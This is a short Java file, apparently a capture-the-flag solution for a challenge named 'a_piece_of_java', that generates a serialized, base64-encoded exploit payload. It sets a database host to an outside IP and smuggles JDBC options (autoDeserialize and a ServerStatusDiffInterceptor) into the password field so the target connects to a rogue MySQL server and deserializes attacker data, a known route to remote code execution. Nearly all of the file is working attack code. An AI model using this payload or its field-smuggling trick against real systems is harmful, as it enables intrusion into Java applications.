package gdufs.challenge.a_piece_of_java;

import gdufs.challenge.a_piece_of_java.invocation.InfoInvocationHandler;
import gdufs.challenge.a_piece_of_java.model.DatabaseInfo;
import gdufs.challenge.a_piece_of_java.model.Info;
import org.junit.jupiter.api.Test;
import org.springframework.boot.test.context.SpringBootTest;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.util.Base64;


class APieceOfJavaApplicationTests {

    public static void main(String[] args) throws Exception{
        DatabaseInfo databaseinfo=new DatabaseInfo();
        databaseinfo.setHost("112.124.52.200");
        databaseinfo.setPort("3308");
        databaseinfo.setUsername("foo");
        databaseinfo.setPassword("1&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor");
        /*
         * infoInvocationHandler * */
        InfoInvocationHandler infoInvocationHandler=new InfoInvocationHandler(databaseinfo);
        /*
         * info */
        Info info=(Info) Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler);
        /*
         * 接下来按照源代码序列化的info用base64打出来
         * */
        ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(info);
        objectOutputStream.close();

        String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()));
        System.out.println(str);
    }



}
